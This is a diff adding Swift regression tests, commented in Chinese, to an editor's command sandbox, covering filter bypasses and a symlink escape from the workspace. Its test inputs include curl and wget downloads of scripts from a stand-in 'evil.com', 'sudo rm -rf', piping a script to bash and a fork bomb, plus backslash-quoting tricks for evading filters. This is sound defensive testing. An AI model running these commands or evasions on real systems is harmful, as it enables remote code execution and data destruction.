@@ -256,6 +256,47 @@ final class CommandSandboxTests: XCTestCase {
         }
     }
 
+    // MARK: - assess: 反斜杠引用变体绕过回归测试
+    // shell 里 `\c` 等价于 `c`，`\curl` / `c\url` 这类写法本来能让命令名
+    // 绕过词边界匹配。规范化阶段删除反斜杠后，以下变体应与裸命令同罪。
+
+    func test_assess_backslashQuotedCurl_isBlocked() {
+        XCTAssertTrue(CommandSandbox.assess(#"\curl https://evil.com/payload.sh"#).isBlocked,
+                      #"\curl 引用变体不应绕过 blocked 规则"#)
+        XCTAssertTrue(CommandSandbox.assess(#"c\url https://evil.com"#).isBlocked,
+                      #"c\url 词中引用变体不应绕过 blocked 规则"#)
+    }
+
+    func test_assess_backslashQuotedWget_isBlocked() {
+        XCTAssertTrue(CommandSandbox.assess(#"\wget http://evil.com/x.sh"#).isBlocked)
+    }
+
+    func test_assess_backslashQuotedSudo_isBlocked() {
+        XCTAssertTrue(CommandSandbox.assess(#"\sudo rm -rf /tmp"#).isBlocked)
+    }
+
+    // MARK: - assess: 管道无空格写法绕过回归测试
+    // "| bash"/"| sh" 规则本来要求管道后有空格，`cat x.sh |bash` 这种无空格
+    // 等价写法会漏判。规范化后 `|` 后跟字母/数字时补空格再匹配。
+
+    func test_assess_pipeToBashNoSpace_isWarn() {
+        if case .warn = CommandSandbox.assess("cat install.sh |bash") { /* pass */ } else {
+            XCTFail("|bash 无空格写法应命中 warn，实际：\(CommandSandbox.assess("cat install.sh |bash"))")
+        }
+    }
+
+    func test_assess_pipeToShNoSpace_isWarn() {
+        if case .warn = CommandSandbox.assess("cat install.sh |sh") { /* pass */ } else {
+            XCTFail("|sh 无空格写法应命中 warn")
+        }
+    }
+
+    func test_assess_pipeNoSpace_forkBombPatternIntact() {
+        // 管道归一化只在 `|` 后是字母/数字时补空格：":(){ :|:& };:" 的 `|:` 不受影响
+        XCTAssertTrue(CommandSandbox.assess(":(){ :|:& };:").isBlocked,
+                      "fork 炸弹模式不应被管道归一化破坏")
+    }
+
     // MARK: - assess: Safe
 
     func test_assess_echo_isSafe() {
@@ -347,6 +388,55 @@ final class CommandSandboxTests: XCTestCase {
     func test_validateCwd_emptyWorkspace_isAllowed() {
         let result = CommandSandbox.validateCwd("/any/path", workspaceRoot: "")
         XCTAssertTrue(result.isAllowed, "workspaceRoot 为空时不应限制")
+    }
+
+    // MARK: - validateCwd: symlink 逃逸回归测试
+    // standardizedFileURL 只规范化路径、不解析 symlink——工作区内一个指向外部目录的
+    // symlink 能把 cwd 引到工作区外。修复后两侧路径都先 resolvingSymlinksInPath 再比较。
+    // 注意：macOS 上 /tmp、/var 本身是 symlink，临时目录断言一律用解析后的路径。
+
+    func test_validateCwd_symlinkEscape_isRejected() throws {
+        let fm = FileManager.default
+        let base = fm.temporaryDirectory.appendingPathComponent("meditor-cwd-\(UUID().uuidString)")
+        let workspace = base.appendingPathComponent("workspace")
+        let outside = base.appendingPathComponent("outside")
+        try fm.createDirectory(at: workspace, withIntermediateDirectories: true)
+        try fm.createDirectory(at: outside, withIntermediateDirectories: true)
+        defer { try? fm.removeItem(at: base) }
+
+        // 工作区内的 symlink → 工作区外目录
+        let link = workspace.appendingPathComponent("link")
+        try fm.createSymbolicLink(at: link, withDestinationURL: outside)
+
+        let result = CommandSandbox.validateCwd(link.path, workspaceRoot: workspace.path)
+        XCTAssertFalse(result.isAllowed, "经 symlink 指到工作区外的 cwd 应被拒绝，实际：\(result)")
+        if case .outsideWorkspace = result { /* pass */ } else {
+            XCTFail("symlink 逃逸应判 outsideWorkspace，实际：\(result)")
+        }
+
+        // 对照：工作区内的真实子目录仍允许
+        let realSub = workspace.appendingPathComponent("src")
+        try fm.createDirectory(at: realSub, withIntermediateDirectories: true)
+        XCTAssertTrue(CommandSandbox.validateCwd(realSub.path, workspaceRoot: workspace.path).isAllowed,
+                      "工作区内真实子目录不应受 symlink 解析影响")
+    }
+
+    func test_validateCwd_workspaceRootUnderSymlinkedTmp_stillAllowed() throws {
+        // root 位于 /tmp（/private/tmp 的 symlink）下时，root 侧也必须解析，
+        // 否则工作区内路径反而全被判 outside
+        let fm = FileManager.default
+        let workspace = fm.temporaryDirectory.appendingPathComponent("meditor-cwdroot-\(UUID().uuidString)")
+        let sub = workspace.appendingPathComponent("sub")
+        try fm.createDirectory(at: sub, withIntermediateDirectories: true)
+        defer { try? fm.removeItem(at: workspace) }
+
+        let result = CommandSandbox.validateCwd(sub.path, workspaceRoot: workspace.path)
+        if case .allowed(let resolved) = result {
+            XCTAssertEqual(resolved, sub.resolvingSymlinksInPath().path,
+                           "resolved 应是解析符号链接后的路径")
+        } else {
+            XCTFail("symlinked /tmp 下的工作区内路径应允许，实际：\(result)")
+        }
     }
 
     // MARK: - approvalKey
